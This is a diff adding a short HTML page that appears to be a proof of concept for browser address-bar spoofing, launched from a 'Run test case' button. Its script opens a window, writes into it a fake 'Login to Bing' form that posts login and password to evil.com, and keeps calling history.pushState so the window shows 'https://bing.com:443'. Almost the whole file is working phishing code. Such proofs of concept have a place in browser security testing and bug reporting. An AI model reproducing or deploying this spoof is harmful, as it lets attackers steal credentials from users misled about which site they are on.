@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bing.com</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        function spoof() {
+            const fakeContent = `
+                <html>
+                <head><title>Bing.com</title></head>
+                <body>
+                    <form method="POST" action="https://evil.com" name="form">
+                        <h2>Login to Bing</h2>
+                        <label>Login:</label><br>
+                        <input name="login"><br>
+                        <label>Password:</label><br>
+                        <input name="Password" type="password"><br><br>
+                        <input type="submit" name="Valid" value="Ok">
+                    </form>
+                </body>
+                </html>`;
+
+            const w = window.open('bing.com:81', '_blank');
+            w.document.open();
+            w.document.write(fakeContent);
+            w.document.close();
+
+            // Use history manipulation + port + iframe-based reload to sustain spoof
+            let spoofUrl = "https://bing.com:443";
+            w.history.pushState({}, '', spoofUrl);
+            setInterval(() => {
+                try {
+                    w.history.pushState({}, '', spoofUrl);
+                } catch (e) {}
+            }, 9000);
+        }
+    </script>
+</head>
+<body>
+    <p class="test">
+        <input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();">
+    </p>
+</body>
+</html>
